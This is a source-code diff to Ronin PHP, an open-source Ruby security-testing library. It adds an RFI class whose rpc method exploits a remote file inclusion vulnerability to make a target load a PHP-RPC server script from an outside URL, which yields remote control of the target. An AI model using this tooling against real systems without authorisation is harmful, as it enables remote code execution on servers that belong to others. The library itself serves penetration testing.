@@ -3,7 +3,7 @@
 # Ronin PHP - A Ruby library for Ronin that provides support for PHP
 # related security tasks.
 #
-# Copyright (c) 2007 Hal Brodigan (postmodern.mod3 at gmail.com)
+# Copyright (c) 2007-2008 Hal Brodigan (postmodern.mod3 at gmail.com)
 #
 # This program is free software; you can redistribute it and/or modify
 # it under the terms of the GNU General Public License as published by
@@ -21,8 +21,26 @@
 #++
 #
 
-require 'ronin/rpc/php/call'
 require 'ronin/rpc/php/client'
-require 'ronin/rpc/php/console'
-require 'ronin/rpc/php/shell'
-require 'ronin/rpc/php/rfi'
+
+module Ronin
+  module PHP
+    class RFI
+      RPC_SERVER_SCRIPT = 'http://ronin.rubyforge.org/dist/php/rpc/server.min.php'
+
+      #
+      # Returns an PHP-RPC Client using the RFI vulnerability to inject
+      # the PHP-RPC Server script using the given _options_.
+      #
+      # _options_ may contain the following keys:
+      # <tt>:server</tt>:: The URL of the PHP-RPC Server script.
+      #                    Defaults to +RPC_SERVER_SCRIPT+.
+      #
+      def rpc(options={})
+        server_script = (options[:server] || RPC_SERVER_SCRIPT)
+
+        return RPC::PHP::Client.new(url_for(server_script),options)
+      end
+    end
+  end
+end
